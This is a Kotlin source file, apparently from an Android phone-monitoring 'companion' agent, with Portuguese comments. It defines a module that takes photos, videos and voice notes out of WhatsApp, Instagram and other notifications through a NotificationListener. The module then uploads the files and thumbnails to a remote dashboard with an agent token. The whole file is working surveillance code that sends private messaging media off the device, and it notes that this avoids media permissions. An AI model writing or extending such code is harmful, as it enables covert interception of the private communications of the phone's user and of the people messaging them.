package com.screenporter.companion.monitoring

import android.content.ContentResolver
import android.content.Context
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.net.Uri
import android.util.Base64
import android.util.Log
import com.screenporter.companion.util.PreferencesManager
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.ByteArrayOutputStream
import java.util.concurrent.TimeUnit

/**
 * Faz upload de multimédia embutido numa notificação (foto/vídeo/nota de voz partilhada
 * no WhatsApp/Instagram/etc.) para /api/agent/upload — o MESMO endpoint que o MediaReporter
 * usa para a galeria. Assim o conteúdo aparece na Galeria de Mídia do dashboard,
 * independentemente de ter vindo por notificação ou por MediaStore scan.
 *
 * Diferença vs MediaReporter: este lê o ficheiro via contentResolver.openInputStream(uri)
 * a partir do URI que vem dentro da Notification (MessagingStyle.Message.getDataUri()),
 * não precisa de path de filesystem nem de permissões READ_MEDIA_* — o NotificationListener
 * já tem acesso ao URI enquanto a notificação está ativa.
 *
 * Dedup: o servidor ignora duplicados (mesmo device+fileName+size nos últimos 5 min),
 * pelo que se o MediaReporter também capturar o mesmo ficheiro da galeria, não há duplicado.
 */
object NotificationMediaUploader {

    private const val TAG = "SP-NotifMedia"
    private const val MAX_FILE_BYTES = 50_000_000L // 50 MB
    private const val THUMBNAIL_MAX_DIM = 400

    private val http: OkHttpClient = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(120, TimeUnit.SECONDS)
        .writeTimeout(120, TimeUnit.SECONDS)
        .build()

    /**
     * Faz upload de um URI de multimédia extraído da notificação.
     *
     * @param uri URI do conteúdo (vem de Message.getDataUri() ou EXTRA_PICTURE)
     * @param mimeType mime type (image/jpeg, video/mp4, audio/ogg, ...)
     * @param type category: "photo" | "video" | "audio"
     * @param source inferido da plataforma (whatsapp, instagram, ...)
     * @param timestampMs momento da captura
     * @return true se upload OK
     */
    fun upload(
        context: Context,
        prefs: PreferencesManager,
        uri: Uri,
        mimeType: String,
        type: String,
        source: String,
        timestampMs: Long
    ): Boolean {
        val token = prefs.authToken ?: run {
            Log.w(TAG, "No auth token — skip upload")
            return false
        }

        // Ler bytes do content:// URI (funciona com URIs de NotificationListener)
        val bytes = readUriToBytes(context.contentResolver, uri) ?: run {
            Log.w(TAG, "Could not read $uri")
            return false
        }
        if (bytes.isEmpty()) return false
        if (bytes.size.toLong() > MAX_FILE_BYTES) {
            Log.d(TAG, "File too large (${bytes.size} bytes) — skip")
            return false
        }

        // Nome de ficheiro: tentar extrair do URI; fallback para timestamp+ext
        val fileName = buildFileName(context, uri, mimeType, type, timestampMs)
        val addr = prefs.serverAddress.trimEnd('/')
        val url = if (addr.startsWith("http")) "$addr/api/agent/upload"
                  else "http://$addr/api/agent/upload"

        val multipart = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("file", fileName, bytes.toRequestBody(mimeType.toMediaType()))
            .addFormDataPart("type", type)
            .addFormDataPart("timestamp", timestampMs.toString())
            .addFormDataPart("source", source)
            .build()

        val req = Request.Builder()
            .url(url)
            .header("X-Agent-Token", token)
            .post(multipart)
            .build()

        return try {
            http.newCall(req).execute().use { resp ->
                if (resp.isSuccessful) {
                    Log.i(TAG, "[$type] Upload OK: $fileName (${bytes.size} bytes) de $source")
                    true
                } else {
                    Log.w(TAG, "[$type] Upload falhou: HTTP ${resp.code}")
                    false
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "[$type] Upload exception: ${e.message}")
            false
        }
    }

    /**
     * Gera uma thumbnail JPEG base64 a partir de um URI de imagem — usada para incluir
     * uma pré-visualização pequena no evento de notificação (além do upload do ficheiro
     * completo para a galeria). Mantém compatibilidade com o campo imageBase64.
     */
    fun thumbnailBase64(context: Context, uri: Uri): String? {
        return try {
            val bmp = loadBitmapFromUri(context, uri, THUMBNAIL_MAX_DIM) ?: return null
            val out = ByteArrayOutputStream()
            var quality = 80
            bmp.compress(Bitmap.CompressFormat.JPEG, quality, out)
            var bytes = out.toByteArray()
            while (bytes.size > 50_000 && quality > 20) {
                quality -= 10
                out.reset()
                bmp.compress(Bitmap.CompressFormat.JPEG, quality, out)
                bytes = out.toByteArray()
            }
            Base64.encodeToString(bytes, Base64.NO_WRAP)
        } catch (e: Exception) {
            Log.d(TAG, "thumbnail failed: ${e.message}")
            null
        }
    }

    private fun readUriToBytes(resolver: ContentResolver, uri: Uri): ByteArray? {
        return try {
            resolver.openInputStream(uri)?.use { it.readBytes() }
        } catch (e: Exception) {
            Log.d(TAG, "readUri failed for $uri: ${e.message}")
            null
        }
    }

    private fun loadBitmapFromUri(context: Context, uri: Uri, maxDim: Int): Bitmap? {
        return try {
            val res = context.contentResolver
            res.openInputStream(uri)?.use { input ->
                val opts = BitmapFactory.Options().apply { inJustDecodeBounds = true }
                BitmapFactory.decodeStream(input, null, opts)
                val sample = calculateSampleSize(opts.outWidth, opts.outHeight, maxDim)
                val realOpts = BitmapFactory.Options().apply { inSampleSize = sample }
                res.openInputStream(uri)?.use { s -> BitmapFactory.decodeStream(s, null, realOpts) }
            }
        } catch (e: Exception) {
            null
        }
    }

    private fun calculateSampleSize(w: Int, h: Int, maxDim: Int): Int {
        var sample = 1
        var max = maxOf(w, h)
        while (max / 2 >= maxDim) { max /= 2; sample *= 2 }
        return sample
    }

    private fun buildFileName(context: Context, uri: Uri, mimeType: String, type: String, ts: Long): String {
        // Tentar extrair DISPLAY_NAME do contentResolver
        var displayName: String? = null
        try {
            context.contentResolver.query(uri, arrayOf(android.provider.OpenableColumns.DISPLAY_NAME), null, null, null)?.use { c ->
                if (c.moveToFirst()) displayName = c.getString(0)
            }
        } catch (_: Exception) {}

        val ext = when {
            mimeType.contains("jpeg") || mimeType.contains("jpg") -> "jpg"
            mimeType.contains("png") -> "png"
            mimeType.contains("mp4") -> "mp4"
            mimeType.contains("ogg") || mimeType.contains("opus") -> "ogg"
            mimeType.contains("mpeg") || mimeType.contains("mp3") -> "mp3"
            mimeType.contains("webm") -> "webm"
            type == "photo" -> "jpg"
            type == "video" -> "mp4"
            type == "audio" -> "ogg"
            else -> "bin"
        }
        return displayName ?: "notif_${ts}_$type.$ext"
    }
}
